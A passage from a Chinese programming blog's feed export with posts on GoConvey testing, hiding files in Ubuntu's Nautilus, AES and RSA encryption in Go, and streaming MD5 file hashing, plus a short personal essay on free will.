<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">should</span>&lt;<span class="title">do</span>-<span class="title">something</span>&gt;<span class="params">(actual <span class="keyword">interface</span>&#123;&#125;, expected ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> &lt;some-important-condition-is-met(actual, expected)&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>   <span class="comment">// empty string means the assertion passed</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;some descriptive message detailing why the assertion failed...&gt;"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举个例子，这里定义一个试试：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">shouldNotGreatThan100</span><span class="params">(actual <span class="keyword">interface</span>&#123;&#125;, expected ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> actual.(<span class="keyword">int</span>) &gt; <span class="number">100</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"too big than 100"</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体使用起来和库里面其它的Assertions是完全一模一样的，没有任何区别，这里就不演示了。</p>
<h2 id="3-定义通用的逻辑"><a href="#3-定义通用的逻辑" class="headerlink" title="3.定义通用的逻辑"></a>3.定义通用的逻辑</h2><p>有时候测试会需要做一些准备工作，而且是重复的，比如说一些初始化操作，这时候就可以定义一个函数完成这件事，不必每次测试重复做，官方文档里面举了一个数据库测试的例子，每次测试前开启事务，测试结束后回滚事务，这里贴一下官方的example，大家看一下，很容易理解：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"database/sql"</span></span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line"></span><br><span class="line">    _ <span class="string">"github.com/lib/pq"</span></span><br><span class="line">    . <span class="string">"github.com/smartystreets/goconvey/convey"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithTransaction</span><span class="params">(db *sql.DB, f <span class="keyword">func</span>(tx *sql.Tx)</span>) <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        tx, err := db.Begin()</span><br><span class="line">        So(err, ShouldBeNil)</span><br><span class="line"></span><br><span class="line">        Reset(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="comment">/* Verify that the transaction is alive by executing a command */</span></span><br><span class="line">            _, err := tx.Exec(<span class="string">"SELECT 1"</span>)</span><br><span class="line">            So(err, ShouldBeNil)</span><br><span class="line"></span><br><span class="line">            tx.Rollback()</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Here we invoke the actual test-closure and provide the transaction */</span></span><br><span class="line">        f(tx)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestUsers</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    db, err := sql.Open(<span class="string">"postgres"</span>, <span class="string">"postgres://localhost?sslmode=disable"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Convey(<span class="string">"Given a user in the database"</span>, t, WithTransaction(db, <span class="function"><span class="keyword">func</span><span class="params">(tx *sql.Tx)</span></span> &#123;</span><br><span class="line">        _, err := tx.Exec(<span class="string">`INSERT INTO "Users" ("id", "name") VALUES (1, 'Test User')`</span>)</span><br><span class="line">        So(err, ShouldBeNil)</span><br><span class="line"></span><br><span class="line">        Convey(<span class="string">"Attempting to retrieve the user should return the user"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">             <span class="keyword">var</span> name <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">             data := tx.QueryRow(<span class="string">`SELECT "name" FROM "Users" WHERE "id" = 1`</span>)</span><br><span class="line">             err = data.Scan(&amp;name)</span><br><span class="line"></span><br><span class="line">             So(err, ShouldBeNil)</span><br><span class="line">             So(name, ShouldEqual, <span class="string">"Test User"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Required table to run the test:</span></span><br><span class="line"><span class="comment">CREATE TABLE "public"."Users" ( </span></span><br><span class="line"><span class="comment">    "id" INTEGER NOT NULL UNIQUE, </span></span><br><span class="line"><span class="comment">    "name" CHARACTER VARYING( 2044 ) NOT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>基本上就是这些，强烈建议大家看一下官方文档，有很多细节这里并没有提到，毕竟咱也不能照抄，这个库完全可以代替官方的库，简单易用，效率高，推荐使用。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Free ～ Will</title>
    <url>/2020/life/free-will.html</url>
    <content><![CDATA[<p>如果现在你说你要去做一款社交软件APP，我大概率会劝你不做，我可能会从市场、资金、成本等多个方面给你分析一通，然后告诉你成功率非常低，你或许认为我总是从最坏的情况考虑，并没有考虑其中的机遇和意外。也许会有人从其它方面分析一通，然后告诉你大有可为，成功率非常高。如果你仔细一想，你会发现两者都有道理，但是只有你真正做了你才能知道哪个是对的，这就像是薛定谔的猫，你只有打开那个盒子才能知道猫是活的还是死的。</p>
<a id="more"></a>

<p>很多人都看过马云创办阿里巴巴的创业史，觉得简直是个奇迹，但是媒体往往都是喜欢把聚光灯打在那些成功人的身上，至于那些死掉的、失败的案例，往往不会被记录，人们也不愿意看，因为成功的案例很少，失败的却有一大堆。</p>
<p>很多书籍往往把我这样的人称为悲观派，因为我们总是考虑最坏的情况，而乐观派往往总是从好的方面考虑。关于这方面，有一个非常经典的比喻：桌子上有半杯水，乐观的会说真好居然还有半杯水，而悲观的人会说唉只有半杯水了。然而这种比喻毫无上下文和事实依据，在当今数字时代，我们通常以数字说话，假如说现在统计表明90%的人都有10杯水，而你只有半杯水，你还乐观的起来吗？</p>
<p>这些文章举这个例子往往是想告诉大家要有一个好的心态，但是事实往往是不以你的心态而转移的，心态只有欺骗自己，却无法左右他人，一味的乐观，甚至会让人感觉有点阿Q。</p>
<p>我们每个人的思想都是受着周围环境的影响，从你出身到长大，你所经历的每一件事情，既是你的记忆，也在塑造了你的思想。</p>
<p>独立思想其实是个很难的事情，我们在生活中往往会发现很多人非常容易被“欺骗”，比如说有些人别人说什么Ta都相信，从不怀疑。这样的人人们你可以说是善良，也可以说是没有独立思想，很容易被洗脑。</p>
<p>洗脑这种事情每天都在发生，我们每天看到的新闻、视频都有可能在给你洗脑，有些是大张旗鼓的宣传，而有些可能是潜移默化的引导。在电影《盗梦空间》里面，有一段对话非常经典：“如果我现在对你说你不要去想大象，你会去想什么？大象”。人的思想是非常人员被操纵的，有人说最成功的的营销就是让你花钱买了东西还觉得自己赚了，实际上你可能并没有赚，甚至还花的更多，这样的事情很常见。</p>
<p>人类社会上千年来都是金字塔结构，这一点从来没有改变，大到国家，小到企业，世界上也没有真正公平和自由，虽然统治阶级几百年来一直在宣传这个概念，但是很多人都明白一个道理，公平和自由往往只存在于金字塔的同维度或者同阶级。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu Nautilus隐藏文件(夹)</title>
    <url>/2020/linux/ubuntu-hidden-file.html</url>
    <content><![CDATA[<p>如何在Ubuntu自带的文件夹管理器Nautilus里面隐藏文件或文件夹呢？</p>
<p>先说一下背景，之所以想到这个问题是因为我的电脑是 Win10+Ubuntu 双系统，有一块硬盘是共享的NTFS格式，在Windows下面分区会有2个文件夹，了解Windows的人应该知道，这是垃圾回收站和磁盘卷信息。</p>
<p>默认情况下在Windows里面这2个文件夹是隐藏的，但是当我切换到Ubuntu的时候，Ubuntu就会给显示出来了，这倒也正常，但是看起来很碍事，不爽，既然不爽我就要搞它。</p>
<a id="more"></a>

<img src = "/images/2020-03-15_18-58.png" />

<p>Nautilus这个文件管理器在很多Linux发行版里面都会使用，我觉得还挺好用哈，默认情况下，它不显示隐藏文件（以.开头的文件），但使用 Ctrl+H 快捷键可以快速显示隐藏文件。</p>
<p>现在问题来了，这2个是文件夹，而且也不是以.开头命名，咋搞呢？</p>
<p>不卖关子了，经过我简单查询，有一种比较简单且行之有效的方式：那就是新建一个.hidden的文件，里面写入你想隐藏的文件或文件夹名字就可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jun:/media/jwang/Data$ cat .hidden </span><br><span class="line"><span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">System Volume Information</span><br></pre></td></tr></table></figure>
<p>最后，经过我调研总结，Ubuntu的Nautilus文件管理器不显示以下3种文件：</p>
<ul>
<li>隐藏文件，即文件名以 (.) 开头的文件。</li>
<li>备份文件，即文件名以 (~) 结尾的文件。</li>
<li>在指定文件夹中的 .hidden 文件里列出的文件。</li>
</ul>
<p>如果有遇到类似问题的小伙伴可以参考一下了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang常见加密算法实现</title>
    <url>/2020/coding/golang/crypt.html</url>
    <content><![CDATA[<p>说完Go里面的md5的用法，这篇文章咱说说用的比较多的加密方式在Go里面如何实现。首先，科普一下，一般待加密的内容被叫作明文，加密使用的关键元素被称为秘钥，加密的结果被称为密文，当然其中还有一个非常关键的加密算法。</p>
<p>一般加密算法可分为对称加密和非对称加密这两个分类，这两者区别很明显，对称加密是指我们拿到秘钥和密文可以解密出明文，在加密和解密时使用的是同一个秘钥；而非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是公开密钥（public key，简称公钥）和私有密钥（private key，简称私钥）。</p>
<a id="more"></a>

<p>本篇文章不是讲如何在Go里面实现这些加密算法，仔细看一下Go标准库里面<strong>crypto</strong>库，你会发现其实Go已经实现很多了加密算法，但是很多人不知道咋用，正如MD5算法一样，它没有提供一个非常简单易用的对外接口，需要你自己再封装一遍，这一点非常不好。。。</p>
<img src="/images/2020-03-08_17-00.png" />

<p>今天我们主要说两种最常用的加密算法：AES对称加密、RSA非对称加密。</p>
<h2 id="AES对称加密"><a href="#AES对称加密" class="headerlink" title="AES对称加密"></a>AES对称加密</h2><p>AES（Advanced Encryption Standard）是最常见的对称加密算法，但是这个算法分很多模式，不同模式的实现方式又有很大差异，比如ECB、CBC、OFB、CFB，详细技术细节这里就不多说了。</p>
<p>有几点需要注意，AES对加密key的长度要求必须固定为16、24、32位，也就是128、192、256比特，所以又有一个AES-128、AES-192、AES-256这种叫法，位数越大安全性越高但加密速度越慢。最关键是对明文长度也有要求，必须是分组长度长度的倍数，AES加密数据块分组长度必须为128bit也就是16位，所以这块又涉及到一个填充问题，而这个填充方式可以分为PKCS7和PKCS5等方式，不得不说是真麻烦。</p>
<p>本文以CBC模式为例来介绍，CBC又有点特殊，它需要一个iv偏移量，iv不一样，结果也不一样所以更安全,这个偏移量必须和分组大小长度一样，也是16位，其实如何去生成iv和填充明文才是最麻烦的地方，但标准库里面并没有给出示例，我网上找了下，先看一个简单的实现：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesCBCEncrypt</span><span class="params">(plainText []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    <span class="comment">// 生成加密用的block</span></span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对IV有随机性要求，但没有保密性要求，所以常见的做法是将IV包含在加密文本当中</span></span><br><span class="line">    cipherText := <span class="built_in">make</span>([]<span class="keyword">byte</span>, aes.BlockSize+<span class="built_in">len</span>(plainText))</span><br><span class="line">    iv := cipherText[:aes.BlockSize]</span><br><span class="line">    <span class="keyword">if</span> _, err := io.ReadFull(rand.Reader, iv); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    mode := cipher.NewCBCEncrypter(block, iv)</span><br><span class="line">    mode.CryptBlocks(cipherText[aes.BlockSize:], plainText)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipherText</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际应用中，秘钥我们可以指定为固定位数，但是需要加密的内容往往是不固定长度的，所以需要做填充，同时在解密的时候就需要去除填充，这里总结了2种填充方法，一个是PKCS7，网上也有些文章称之为PKCS5，另一个是0填充。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(src []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    padding := blockSize - <span class="built_in">len</span>(src)%blockSize</span><br><span class="line">    padText := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(src, padText...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    length := <span class="built_in">len</span>(origData)</span><br><span class="line">    unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ZeroPadding</span><span class="params">(src []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    padding := blockSize - <span class="built_in">len</span>(src)%blockSize</span><br><span class="line">    padText := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="number">0</span>&#125;, padding)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(src, padText...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ZeroUnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> bytes.TrimFunc(origData,</span><br><span class="line">        <span class="function"><span class="keyword">func</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">            <span class="keyword">return</span> r == <span class="keyword">rune</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密的过程首先是要提取出iv，然后解密，最后去除填充得到明文，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesCBCDecrypt</span><span class="params">(cipherText []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cipherText) &lt; aes.BlockSize &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"cipher text too short"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    iv := cipherText[:aes.BlockSize]</span><br><span class="line">    cipherText = cipherText[aes.BlockSize:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cipherText)%aes.BlockSize != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"cipher text is not a multiple of the block size"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mode := cipher.NewCBCDecrypter(block, iv)</span><br><span class="line">    mode.CryptBlocks(cipherText, cipherText)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipherText</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，咱们来看一个简单的使用示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 需要被加密的内容，需要填充</span></span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"Hello，我是一个测试加密内容你知道吗？？？"</span></span><br><span class="line">    <span class="comment">// key必须是16\24\32位</span></span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">"1234567890123456"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用了PKCS7填充法</span></span><br><span class="line">    cipherText := AesCBCEncrypt(PKCS7Padding([]<span class="keyword">byte</span>(src), aes.BlockSize), []<span class="keyword">byte</span>(key))</span><br><span class="line">    <span class="comment">// 为方便展示，用base64编码</span></span><br><span class="line">    fmt.Printf(<span class="string">"cipherText text is %s\n"</span>, base64.StdEncoding.EncodeToString(cipherText))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    plainText := AesCBCDecrypt(cipherText, []<span class="keyword">byte</span>(key))</span><br><span class="line">    fmt.Printf(<span class="string">"plain text is %s\n"</span>, PKCS7UnPadding(plainText))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 由于每次iv是随机的，所以结果都不一样，但是解密之后的明文都正确</span></span><br><span class="line"><span class="comment">// cipherText text is gFGf2lw9EQzQGxUtJGFQWDOaP3uU9CVWvLWCpSbeb9zrJqLUbSjS6d6GljtleGCFPFLWZZZ4a1RvKxR8wVT0d/U0cn8F4nwhEnun4Ba3t0M=</span></span><br><span class="line"><span class="comment">// plain text is Hello，我是一个测试加密内容你知道吗？？？</span></span><br></pre></td></tr></table></figure>
<h2 id="RSA非对称加密"><a href="#RSA非对称加密" class="headerlink" title="RSA非对称加密"></a>RSA非对称加密</h2><p>RSA非对称加密需要一对秘钥，一个公钥，一个私钥，公钥加密之后私钥才能解密，私钥加密之后公钥才能解密，其最广泛的应用莫过于https、ssh，安全性高，但是速度相对较慢。</p>
<p>首先，我们得生成一对秘钥，方法有很多种，我们可以用工具生成，比如在Linux下面可以使用openssl命令生成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成私钥</span></span><br><span class="line">openssl genrsa -out private.pem 2048</span><br><span class="line"><span class="comment"># 生成公钥</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> private.pem -outform PEM -pubout -out public.pem</span><br></pre></td></tr></table></figure>
<p>也可以使用一些工具生成，保存起来，值得一提的是这个秘钥的格式还有很多说法，这里暂不细说，如果遇到问题了，不妨留意一下。</p>
<p>Go的crypto库提供了一些方法来进行rsa的加密和解密操作，不过同样我们还得自己组装起来，先看一下加密：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RsaEncrypt</span><span class="params">(plainText []<span class="keyword">byte</span>, keyPath <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    <span class="comment">// 读取公钥</span></span><br><span class="line">    file, _ := os.Open(keyPath)</span><br><span class="line">    fileInfo, _ := file.Stat()</span><br><span class="line">    data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, fileInfo.Size())</span><br><span class="line">    _, _ = file.Read(data)</span><br><span class="line">    <span class="comment">// pem解码</span></span><br><span class="line">    block, _ := pem.Decode(data)</span><br><span class="line">    publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    cipherText, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey.(*rsa.PublicKey), plainText)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cipherText</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是解密：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RsaDecrypt</span><span class="params">(cipherText []<span class="keyword">byte</span>, keyPath <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    <span class="comment">// 读取私钥</span></span><br><span class="line">    file, _ := os.Open(keyPath)</span><br><span class="line">    fileInfo, _ := file.Stat()</span><br><span class="line">    data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, fileInfo.Size())</span><br><span class="line">    _, _ = file.Read(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pem解码</span></span><br><span class="line">    block, _ := pem.Decode(data)</span><br><span class="line">    privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    plainText, err := rsa.DecryptPKCS1v15(rand.Reader, privateKey, cipherText)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plainText</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综合示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"1234567890"</span></span><br><span class="line">    cipherText := RsaEncrypt([]<span class="keyword">byte</span>(src), <span class="string">"/path/to/public.pem"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// base64编码输出</span></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, base64.StdEncoding.EncodeToString(cipherText))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    plainText := RsaDecrypt(cipherText, <span class="string">"/path/to/private.pem"</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, plainText)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RSA加密每次的结果都不一样，安全性虽高，但是也有缺点，速度慢，而且加密的内容不能太大，最大不能超过秘钥的长度，比如说这个例子里面秘钥是2048位的，也就是256字节，如果超过了可能就需要你特殊处理了，比如分割成多段依次加密。</p>
<p>总之，在Go里面使用加密的话需要根据实际情况调整，不同加密方式的实现细节有很多不一样的地方，好在标准库大部分都实现了，只需要我们花点功夫研究一下咋去使用。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>RSA</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang计算文件MD5</title>
    <url>/2020/coding/golang/file-md5.html</url>
    <content><![CDATA[<p>前面这篇文章<a href="https://wangbjun.site/2020/coding/golang/md5.html">&lt;Golang里面MD5的写法和性能&gt;</a>介绍了如何计算字符串的md5，下面我们来说说如何计算文件的md5。</p>
<a id="more"></a>

<h2 id="1-错误的方式"><a href="#1-错误的方式" class="headerlink" title="1.错误的方式"></a>1.错误的方式</h2><p>有人说，文件可以读取成字符串，然后再计算就可以了，如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FileMD5</span><span class="params">(filePath <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">    file, err := os.Open(filePath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    all, err := ioutil.ReadAll(file)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MD5(<span class="keyword">string</span>(all)), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此方法确实没问题，但是需要考虑一个问题，假如文件比较大呢？比如有好几个GB，如果按这个做法也得占用好几个GB内存，肯定存在问题。</p>
<p>经过我测试，在实际运行中，这种方式占用的内存是文件大小的好几倍，1个GB的文件需要大概4个GB的内存，太恐怖了。</p>
<h2 id="2-正确的方式"><a href="#2-正确的方式" class="headerlink" title="2.正确的方式"></a>2.正确的方式</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FileMD5</span><span class="params">(filePath <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">    file, err := os.Open(filePath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    hash := md5.New()</span><br><span class="line">    _, _ = io.Copy(hash, file)</span><br><span class="line">    <span class="keyword">return</span> hex.EncodeToString(hash.Sum(<span class="literal">nil</span>)), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过实际测试发现占用内存几乎非常非常少，这里大家就会发现md5.New()的用途所在了，简单分析一下为什么这种方式占用内存少。</p>
<p>首先要了解<strong>io.Copy</strong>方法的含义，可以先看看注释：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Copy copies from src to dst until either EOF is reached</span></span><br><span class="line"><span class="comment">// on src or an error occurs. It returns the number of bytes</span></span><br><span class="line"><span class="comment">// copied and the first error encountered while copying, if any.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A successful Copy returns err == nil, not err == EOF.</span></span><br><span class="line"><span class="comment">// Because Copy is defined to read from src until EOF, it does</span></span><br><span class="line"><span class="comment">// not treat an EOF from Read as an error to be reported.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If src implements the WriterTo interface,</span></span><br><span class="line"><span class="comment">// the copy is implemented by calling src.WriteTo(dst).</span></span><br><span class="line"><span class="comment">// Otherwise, if dst implements the ReaderFrom interface,</span></span><br><span class="line"><span class="comment">// the copy is implemented by calling dst.ReadFrom(src).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Copy</span><span class="params">(dst Writer, src Reader)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> copyBuffer(dst, src, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来，它底层调用了一个copyBuffer，这个方法底层在copy的时候会临时分配一个buffer缓存区，默认大小32k，每次只会占用32k大小内存，如果想自定义缓存区大小可以使用<strong>CopyBuffer</strong>:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CopyBuffer is identical to Copy except that it stages through the</span></span><br><span class="line"><span class="comment">// provided buffer (if one is required) rather than allocating a</span></span><br><span class="line"><span class="comment">// temporary one. If buf is nil, one is allocated; otherwise if it has</span></span><br><span class="line"><span class="comment">// zero length, CopyBuffer panics.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyBuffer</span><span class="params">(dst Writer, src Reader, buf []<span class="keyword">byte</span>)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> buf != <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(buf) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"empty buffer in io.CopyBuffer"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copyBuffer(dst, src, buf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后配合Sum方法，每次计算32k，不断循环计算，直到算完，所以几乎不占用内存。</p>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>如果计算的文件都是小文件，内存比较大的话，追求速度的话可以使用第一种方法，如果你计算的文件非常大，务必使用第二种方法，不然内存会爆掉。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
